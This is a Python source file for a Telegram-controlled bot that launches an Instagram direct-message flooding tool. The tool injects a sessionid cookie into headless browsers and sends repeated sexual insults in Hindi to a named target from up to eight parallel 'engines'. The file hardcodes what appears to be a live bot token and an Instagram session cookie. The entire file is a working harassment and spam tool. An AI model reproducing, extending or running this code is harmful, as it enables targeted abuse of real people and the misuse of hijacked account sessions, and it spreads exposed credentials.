#!/usr/bin/env python3
"""
🐗 InosukexGOD — All-in-One Telegram Bot + Attack Engine
"""

# ═══════════════════════════════════════════════════
#  AUTO INSTALL
# ═══════════════════════════════════════════════════
import subprocess, sys, os

def auto_install():
    pkgs = ["python-telegram-bot[job-queue]>=20.0", "playwright"]
    print("🐗 Installing dependencies...")
    for pkg in pkgs:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", pkg, "-q"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    print("✅ Dependencies ready. Starting bot...")

auto_install()

# ═══════════════════════════════════════════════════
#  IMPORTS
# ═══════════════════════════════════════════════════
import asyncio, json, time, random, shutil
from pathlib import Path
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes,
)
from telegram.constants import ParseMode

# ═══════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════
BOT_TOKEN = "8981191823:AAExQsM63RVXTBDFN8o1w-XYTNjDsYaFy7A"
ADMIN_ID  = 8609127164

# ═══════════════════════════════════════════════════
#  DEFAULT ATTACK CONFIG
# ═══════════════════════════════════════════════════
user_cfg = {
    "sid"    : "76248746678%3AirYuiwG9HsICGO%3A16%3AAYhv33lYNP9duoepc2MnnXv0JMeP9MwKrugV-FGM9g",
    "url"    : "https://www.instagram.com/direct/t/1704768377345706/",
    "target" : "CHUNKI/CHUDARA",
    "engines": 6,
    "delay"  : 0.05,
}

# ═══════════════════════════════════════════════════
#  STATE
# ═══════════════════════════════════════════════════
approved: set  = set()
pending:  dict = {}
attack_proc    = None
APPROVED_FILE  = Path("approved.json")

def load_approved():
    global approved
    if APPROVED_FILE.exists():
        approved = set(json.loads(APPROVED_FILE.read_text()))

def save_approved():
    APPROVED_FILE.write_text(json.dumps(list(approved)))

def is_admin(uid): return uid == ADMIN_ID
def is_approved(uid): return uid == ADMIN_ID or uid in approved

# ═══════════════════════════════════════════════════
#  ATTACK SCRIPT TEMPLATE
# ═══════════════════════════════════════════════════
ATTACK_CODE = r'''
import asyncio, os, random, sys, time, shutil, json
from playwright.async_api import async_playwright

with open("_attack_cfg.json") as _f:
    _c = json.load(_f)

SID      = _c["sid"]
URL      = _c["url"]
OPPONENT = _c["target"]
ENGINES  = _c["engines"]
DELAY    = _c["delay"]

MSGS = [
    "[TARGET] SYSTEM OVERLOAD teri aukat nahi hum se ladne ki 😂🦅",
    "[TARGET] TUMHARI MAA KO CHOD DAALENGE //~ 🔥",
    "[TARGET] TERI MMY KO KINNAR GROUP WALE CHODENGE YAAD RAKHNA 😝🤲",
    "[TARGET] TERI MAA KE BHOSDE MAI ITNE CHANTE MARUNGA FAAT JAYEGA 🐒🤣🔥",
    "[TARGET] INOSUKE SIDE ACTIVE ab rone ke alawa koi rasta nahi 🔥"
    " |꧁𓊈𒆜 INOSUKE bhagwan hai 👑 ꧂|",
]

def payload(opp):
    rid  = random.randint(1000, 9999)
    gap  = "\n" * 160
    core = random.choice(MSGS).replace("[TARGET]", f"[{opp}]")
    return f"{core}{gap}{core}{gap}{core}\n🐗 INOSUKE GOD [{rid}] 🐗"

async def block(route):
    if route.request.resource_type in ["image", "media", "font"]:
        await route.abort()
    else:
        await route.continue_()

async def engine(eid, sid, url, opp, locker):
    udd = f"./sess_{eid}"
    while True:
        async with async_playwright() as p:
            br = await p.chromium.launch_persistent_context(
                udd, headless=True,
                args=["--no-sandbox","--disable-gpu",
                      "--disable-dev-shm-usage","--single-process"]
            )
            await br.add_cookies([{
                "name": "sessionid", "value": sid,
                "domain": ".instagram.com", "path": "/",
                "secure": True, "httpOnly": True
            }])
            pg = await br.new_page()
            await pg.route("**/*", block)
            try:
                await pg.goto(url, wait_until="domcontentloaded", timeout=60000)
                mb = pg.locator('div[role="textbox"], div[aria-label="Message"]').first
                mc = 0
                for _ in range(150):
                    if mc > 0 and mc % 30 == 0:
                        print(f"🧹 [E-{eid}] DOM RELOAD", flush=True)
                        await pg.reload(wait_until="domcontentloaded")
                        mb = pg.locator('div[role="textbox"], div[aria-label="Message"]').first
                        await mb.focus()
                    if locker and mc >= 19:
                        mc = 0
                        await mb.focus()
                    await mb.focus()
                    await mb.fill(payload(opp))
                    await pg.keyboard.press("Enter")
                    mc += 1
                    tag = "LOCKER" if locker else "SLAMMER"
                    print(f"[E-{eid}][{tag}] STRIKE:{mc} | 🐗 InosukexGOD", flush=True)
                    await asyncio.sleep(random.uniform(DELAY, DELAY + 0.05))
            except Exception as e:
                print(f"⚠️ [E-{eid}] {e}", flush=True)
            await br.close()
            if os.path.exists(udd):
                shutil.rmtree(udd, ignore_errors=True)
            await asyncio.sleep(1)

async def main():
    sids  = SID if isinstance(SID, list) else [SID]
    tasks = [
        engine(i+1, sids[i % len(sids)], URL, OPPONENT, i == 0)
        for i in range(ENGINES)
    ]
    await asyncio.gather(*tasks)

asyncio.run(main())
'''

def write_attack(cfg: dict) -> Path:
    Path("_attack_cfg.json").write_text(json.dumps(cfg))
    p = Path("_attack_run.py")
    p.write_text(ATTACK_CODE)
    return p

# ═══════════════════════════════════════════════════
#  KEYBOARDS
# ═══════════════════════════════════════════════════
def kb_main(uid: int) -> InlineKeyboardMarkup:
    rows = [
        [
            InlineKeyboardButton("🎯 Launch Attack",  callback_data="launch"),
            InlineKeyboardButton("🛑 Stop Attack",    callback_data="stop"),
        ],
        [
            InlineKeyboardButton("⚙️ Settings",       callback_data="settings"),
            InlineKeyboardButton("🖥️ Live Terminal",  callback_data="terminal"),
        ],
        [
            InlineKeyboardButton("📊 Status",          callback_data="status"),
            InlineKeyboardButton("🔄 Refresh",         callback_data="menu"),
        ],
    ]
    if is_admin(uid):
        rows.append([InlineKeyboardButton("👥 Manage Users", callback_data="manage")])
    return InlineKeyboardMarkup(rows)

def kb_settings() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🎯 Target",      callback_data="set_target"),
            InlineKeyboardButton("🔗 URL",         callback_data="set_url"),
        ],
        [
            InlineKeyboardButton("🔑 Session ID",  callback_data="set_session"),
            InlineKeyboardButton("⚡ Engines",     callback_data="set_engines"),
        ],
        [InlineKeyboardButton("🔙 Back",            callback_data="menu")],
    ])

def kb_request() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("🔓 Request Access", callback_data="req_access")
    ]])

def kb_approve(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("✅ Approve", callback_data=f"approve_{uid}"),
        InlineKeyboardButton("❌ Deny",    callback_data=f"deny_{uid}"),
    ]])

def kb_manage() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📋 Approved List", callback_data="list_approved")],
        [InlineKeyboardButton("⏳ Pending Reqs",  callback_data="list_pending")],
        [InlineKeyboardButton("🔙 Back",           callback_data="menu")],
    ])

def kb_back(dest="menu") -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("🔙 Back", callback_data=dest)
    ]])

# ═══════════════════════════════════════════════════
#  /start
# ═══════════════════════════════════════════════════
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    name = update.effective_user.first_name or "User"
    if is_approved(uid):
        await update.message.reply_text(
            f"🐗 *InosukexGOD Control Panel*\n\n"
            f"Welcome back, *{name}*!\n"
            f"Apna action choose karo 👇",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb_main(uid)
        )
    else:
        await update.message.reply_text(
            f"🔒 *INOSUKE BOT — LOCKED*\n\n"
            f"Oi *{name}*, yeh bot private hai.\n"
            f"Access chahiye toh request karo 👇",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb_request()
        )

# ═══════════════════════════════════════════════════
#  CALLBACK ROUTER
# ═══════════════════════════════════════════════════
async def callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    global attack_proc
    q    = update.callback_query
    await q.answer()
    uid  = q.from_user.id
    data = q.data

    # ─── Request Access ───────────────────────────
    if data == "req_access":
        if is_approved(uid):
            await q.edit_message_text("✅ Tumhe already access hai. /start bhejo.")
            return
        if uid in pending:
            await q.edit_message_text("⏳ Request pehle se hai. Admin ka wait karo.")
            return
        pending[uid] = {
            "name"    : q.from_user.first_name or "Unknown",
            "username": q.from_user.username   or "N/A",
        }
        try:
            await ctx.bot.send_message(
                ADMIN_ID,
                f"🔔 *Naya Access Request!*\n\n"
                f"👤 Name: *{pending[uid]['name']}*\n"
                f"🔗 Username: @{pending[uid]['username']}\n"
                f"🆔 ID: `{uid}`\n\n"
                f"Approve ya Deny karo 👇",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=kb_approve(uid)
            )
            await q.edit_message_text(
                "⏳ *Request bhej di!*\n\nAdmin approve karega toh tumhe notification milegi.",
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception as e:
            await q.edit_message_text(f"❌ Error: {e}")
        return

    # ─── Admin: Approve ───────────────────────────
    if data.startswith("approve_") and is_admin(uid):
        tuid = int(data.split("_")[1])
        approved.add(tuid)
        save_approved()
        info = pending.pop(tuid, {"name": "User", "username": "N/A"})
        await q.edit_message_text(
            f"✅ *Approved!*\n👤 {info['name']} (`{tuid}`)",
            parse_mode=ParseMode.MARKDOWN
        )
        try:
            await ctx.bot.send_message(
                tuid,
                "✅ *Access Mil Gaya!*\n\n"
                "Ab tum bot use kar sakte ho.\n"
                "/start bhejo 🐗",
                parse_mode=ParseMode.MARKDOWN,
            )
        except:
            pass
        return

    # ─── Admin: Deny ──────────────────────────────
    if data.startswith("deny_") and is_admin(uid):
        tuid = int(data.split("_")[1])
        info = pending.pop(tuid, {"name": "User"})
        await q.edit_message_text(
            f"❌ *Denied!*\n👤 {info['name']} (`{tuid}`)",
            parse_mode=ParseMode.MARKDOWN
        )
        try:
            await ctx.bot.send_message(tuid, "❌ Tumhara access request deny kar diya gaya.")
        except:
            pass
        return

    # ─── Access Gate ──────────────────────────────
    if not is_approved(uid):
        await q.answer("🔒 Access nahi hai.", show_alert=True)
        return

    # ─── Main Menu ────────────────────────────────
    if data == "menu":
        running = attack_proc is not None and attack_proc.returncode is None
        state   = "🟢 RUNNING" if running else "🔴 IDLE"
        await q.edit_message_text(
            f"🐗 *InosukexGOD Panel*\n\n"
            f"Attack: {state}\n"
            f"Target: `{user_cfg['target']}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb_main(uid)
        )

    # ─── Status ───────────────────────────────────
    elif data == "status":
        running = attack_proc is not None and attack_proc.returncode is None
        state   = "🟢 RUNNING" if running else "🔴 IDLE"
        await q.edit_message_text(
            f"📊 *Current Status*\n\n"
            f"🔥 Attack: `{state}`\n"
            f"🎯 Target: `{user_cfg['target']}`\n"
            f"🔗 URL: `{user_cfg['url'][:45]}...`\n"
            f"🔑 Session: `{user_cfg['sid'][:20]}...`\n"
            f"⚡ Engines: `{user_cfg['engines']}`\n"
            f"⏱️ Delay: `{user_cfg['delay']}s`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb_back("menu")
        )

    # ─── Settings ─────────────────────────────────
    elif data == "settings":
        await q.edit_message_text(
            f"⚙️ *Settings*\n\n"
            f"🎯 Target: `{user_cfg['target']}`\n"
            f"🔗 URL: `{user_cfg['url'][:45]}...`\n"
            f"🔑 Session: `{user_cfg['sid'][:20]}...`\n"
            f"⚡ Engines: `{user_cfg['engines']}`\n"
            f"⏱️ Delay: `{user_cfg['delay']}s`\n\n"
            f"Kya change karna hai?",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb_settings()
        )

    elif data == "set_target":
        ctx.user_data["await"] = "target"
        await q.edit_message_text(
            "🎯 Naya *Target Name* bhejo:",
            parse_mode=ParseMode.MARKDOWN
        )
    elif data == "set_url":
        ctx.user_data["await"] = "url"
        await q.edit_message_text(
            "🔗 Naya *Instagram Group URL* bhejo:",
            parse_mode=ParseMode.MARKDOWN
        )
    elif data == "set_session":
        ctx.user_data["await"] = "session"
        await q.edit_message_text(
            "🔑 Apna *Session ID* bhejo:",
            parse_mode=ParseMode.MARKDOWN
        )
    elif data == "set_engines":
        ctx.user_data["await"] = "engines"
        await q.edit_message_text(
            "⚡ *Engine count* bhejo (1 se 8 tak):",
            parse_mode=ParseMode.MARKDOWN
        )

    # ─── Launch Attack ────────────────────────────
    elif data == "launch":
        if attack_proc is not None and attack_proc.returncode is None:
            await q.edit_message_text(
                "⚡ *Attack pehle se chal raha hai!*\n\nRokna ho toh Stop karo.",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=kb_main(uid)
            )
            return
        script = write_attack(user_cfg)
        attack_proc = await asyncio.create_subprocess_exec(
            sys.executable, str(script),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        await q.edit_message_text(
            f"🐗 *ATTACK LAUNCHED!*\n\n"
            f"🎯 Target: `{user_cfg['target']}`\n"
            f"⚡ Engines: `{user_cfg['engines']}`\n"
            f"⏱️ Delay: `{user_cfg['delay']}s`\n\n"
            f"Live Terminal se output dekho 👇",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb_main(uid)
        )

    # ─── Stop Attack ──────────────────────────────
    elif data == "stop":
        if attack_proc is None or attack_proc.returncode is not None:
            await q.edit_message_text(
                "🔴 Koi attack nahi chal raha.",
                reply_markup=kb_main(uid)
            )
            return
        attack_proc.terminate()
        await asyncio.sleep(0.5)
        await q.edit_message_text(
            "🛑 *Attack band kar diya.*\n\nSaare engines stop ho gaye.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb_main(uid)
        )

    # ─── Live Terminal ────────────────────────────
    elif data == "terminal":
        if attack_proc is None or attack_proc.returncode is not None:
            await q.edit_message_text(
                "🔴 Attack nahi chal raha.\nPehle Launch karo.",
                reply_markup=kb_main(uid)
            )
            return
        msg = await ctx.bot.send_message(
            uid,
            "🖥️ *Live Terminal*\n```\nConnecting to engines...\n```",
            parse_mode=ParseMode.MARKDOWN
        )
        asyncio.create_task(stream_terminal(ctx, uid, msg.message_id))
        await q.edit_message_text(
            "🖥️ *Terminal open hua neeche* 👇\n\nHar 2.5 sec mein update hoga.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb_main(uid)
        )

    # ─── Manage Users (admin only) ────────────────
    elif data == "manage" and is_admin(uid):
        total_approved = len(approved)
        total_pending  = len(pending)
        await q.edit_message_text(
            f"👥 *User Management*\n\n"
            f"✅ Approved: `{total_approved}`\n"
            f"⏳ Pending: `{total_pending}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb_manage()
        )

    elif data == "list_approved" and is_admin(uid):
        if not approved:
            text = "📋 Koi approved user nahi abhi tak."
        else:
            lines = [f"• `{x}`" for x in approved]
            text  = f"📋 *Approved Users ({len(approved)}):*\n" + "\n".join(lines)
        await q.edit_message_text(
            text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb_back("manage")
        )

    elif data == "list_pending" and is_admin(uid):
        if not pending:
            await q.edit_message_text(
                "⏳ Koi pending request nahi.",
                reply_markup=kb_back("manage")
            )
            return
        text = f"⏳ *Pending Requests ({len(pending)}):*\n"
        text += "\n".join(
            f"• *{v['name']}* @{v['username']} — `{k}`"
            for k, v in pending.items()
        )
        rows = [
            [
                InlineKeyboardButton(f"✅ {v['name']}", callback_data=f"approve_{k}"),
                InlineKeyboardButton("❌ Deny",          callback_data=f"deny_{k}"),
            ]
            for k, v in pending.items()
        ]
        rows.append([InlineKeyboardButton("🔙 Back", callback_data="manage")])
        await q.edit_message_text(
            text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(rows)
        )

# ═══════════════════════════════════════════════════
#  LIVE TERMINAL STREAMER
# ═══════════════════════════════════════════════════
async def stream_terminal(ctx: ContextTypes.DEFAULT_TYPE, uid: int, mid: int):
    global attack_proc
    if attack_proc is None:
        return
    lines     = []
    last_edit = time.time()
    try:
        async for raw in attack_proc.stdout:
            line = raw.decode(errors="ignore").strip()
            if not line:
                continue
            lines.append(line)
            if len(lines) > 40:
                lines = lines[-40:]
            if time.time() - last_edit >= 2.5:
                block = "\n".join(lines[-20:])
                text  = f"🖥️ *Live Terminal*\n```\n{block}\n```"
                if len(text) > 4000:
                    text = "🖥️ *Live Terminal*\n```\n" + block[-3800:] + "\n```"
                try:
                    await ctx.bot.edit_message_text(
                        chat_id=uid,
                        message_id=mid,
                        text=text,
                        parse_mode=ParseMode.MARKDOWN
                    )
                except:
                    pass
                last_edit = time.time()
    except:
        pass
    try:
        await ctx.bot.edit_message_text(
            chat_id=uid,
            message_id=mid,
            text="🖥️ *Terminal*\n```\n[PROCESS ENDED — Attack stopped]\n```",
            parse_mode=ParseMode.MARKDOWN
        )
    except:
        pass

# ═══════════════════════════════════════════════════
#  MESSAGE HANDLER (settings input)
# ═══════════════════════════════════════════════════
async def msg_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    if not is_approved(uid):
        return
    key  = ctx.user_data.get("await")
    if not key:
        return
    text = update.message.text.strip()
    if key == "target":
        user_cfg["target"] = text
        reply = f"✅ *Target set!*\n`{text}`"
    elif key == "url":
        user_cfg["url"] = text
        reply = "✅ *URL updated!*"
    elif key == "session":
        user_cfg["sid"] = text
        reply = "✅ *Session ID updated!*"
    elif key == "engines":
        try:
            n = max(1, min(8, int(text)))
            user_cfg["engines"] = n
            reply = f"✅ *Engines set!*\n`{n}` engines active honge."
        except:
            reply = "❌ Number bhejo (1 se 8 tak)."
    else:
        return
    ctx.user_data.pop("await", None)
    await update.message.reply_text(
        reply,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=kb_main(uid)
    )

# ═══════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════
def main():
    load_approved()
    print("🐗 InosukexGOD Bot starting...")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, msg_handler))
    print("✅ Bot is LIVE — waiting for messages...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
